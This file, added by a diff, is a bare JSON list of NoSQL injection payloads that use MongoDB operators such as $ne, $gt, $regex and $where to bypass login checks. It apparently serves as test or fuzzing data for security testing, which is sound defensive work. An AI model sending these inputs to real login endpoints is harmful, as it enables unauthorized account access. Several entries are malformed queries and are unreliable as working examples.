@@ -1,0 +1,35 @@
+[
+  { "username": { "$ne": null }, "password": "password" },
+  { "username": "admin", "password": { "$ne": null } },
+  { "username": "admin", "password": { "$gt": "" } },
+  { "username": { "$exists": true }, "password": "password" },
+  { "username": "admin", "password": { "$lt": "z" } },
+  { "username": { "$regex": "" }, "password": "password" },
+  { "username": { "$ne": "nonexistent" }, "password": "password" },
+  { "username": { "$in": ["admin", "user"] }, "password": "password" },
+  { "username": { "$nin": [] }, "password": "password" },
+  { "username": "admin", "password": { "$gte": "" } },
+  { "username": { "$type": "string" }, "password": "password" },
+  { "username": { "$not": { "$eq": null } }, "password": "password" },
+  {
+    "username": { "$and": [{ "$gt": "" }, { "$lt": "z" }] },
+    "password": "password"
+  },
+  {
+    "username": { "$or": [{ "$gt": "" }, { "$lt": "z" }] },
+    "password": "password"
+  },
+  { "username": { "$mod": [1, 0] }, "password": "password" },
+  {
+    "username": { "$where": "this.password.length > 0" },
+    "password": "password"
+  },
+  { "username": { "$ne": "admin" }, "password": { "$ne": "wrong_password" } },
+  { "username": { "$gt": "a" }, "password": "password" },
+  { "username": { "$regex": "^admin$" }, "password": { "$ne": null } },
+  {
+    "username": { "$regex": "^[a-zA-Z0-9]$" },
+    "password": { "$ne": "admin" }
+  },
+  { "username": { "$in": ["admin", "root"] }, "password": { "$ne": null } }
+]
